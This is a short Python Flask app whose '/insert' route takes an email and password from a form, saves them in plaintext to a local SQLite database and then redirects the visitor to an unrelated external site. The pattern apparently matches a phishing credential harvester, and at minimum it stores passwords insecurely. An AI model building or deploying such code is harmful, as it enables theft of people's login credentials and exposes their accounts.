from flask import Flask,render_template,request,redirect
import sqlite3
app = Flask(__name__)
@app.route('/')
def home():
    return render_template("index.html")
@app.route('/insert',methods=['GET','POST'])
def insert():
    url="https://tse4.mm.bing.net/th?id=OIP.aBhALad4txuWlHF3z4r0HwHaHa&pid=Api&P=0&w=300&h=300"
    email=request.form['email']
    pas=request.form['pass']
    conn=sqlite3.connect("hello.db")
    cur=conn.cursor()
    cur.execute("insert into hello values(?,?)",(email,pas))
    conn.commit()
    conn.close()
    url="https://gameskharido.in/app"
    return redirect(url)
    
if __name__ == '__main__':
    app.run()
    
